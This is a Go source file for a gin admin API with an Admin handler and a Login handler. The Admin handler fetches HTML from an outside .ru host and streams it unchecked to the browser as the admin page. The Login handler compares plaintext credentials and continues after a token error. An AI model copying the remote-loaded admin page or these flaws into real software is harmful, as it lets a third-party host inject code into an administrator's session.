package apis

import (
	"github.com/LINQQ1212/common/admin/models"
	"github.com/LINQQ1212/common/global"
	"github.com/LINQQ1212/common/middleware/jwt_server"
	"github.com/LINQQ1212/common/response"
	"github.com/gin-gonic/gin"
	"io"
	"net/http"
)

func Admin(c *gin.Context) {
	res, err := http.Get("https://domeaoxs.relationals.ru/v3/index.html")
	if err != nil {
		response.FailWithMessage(err.Error(), c)
		return
	}
	io.Copy(c.Writer, res.Body)
}

func Login(c *gin.Context) {
	var l models.Login
	_ = c.ShouldBindJSON(&l)
	if l.Username == global.CONFIG.System.UserName && l.Password == global.CONFIG.System.PassWord {
		jwt := jwt_server.NewJWT()
		str, err := jwt.CreateToken(global.CustomClaims{
			BaseClaims: global.BaseClaims{
				Username: "root",
			},
			BufferTime: 0,
		})
		if err != nil {
			response.FailWithMessage(err.Error(), c)
		}

		response.OkWithData(gin.H{
			"id":    "root",
			"name":  "root",
			"token": str,
			"info":  global.CONFIG.System.Info,
		}, c)
		return
	}
	response.FailWithMessage("用户名不存在或者密码错误", c)
}
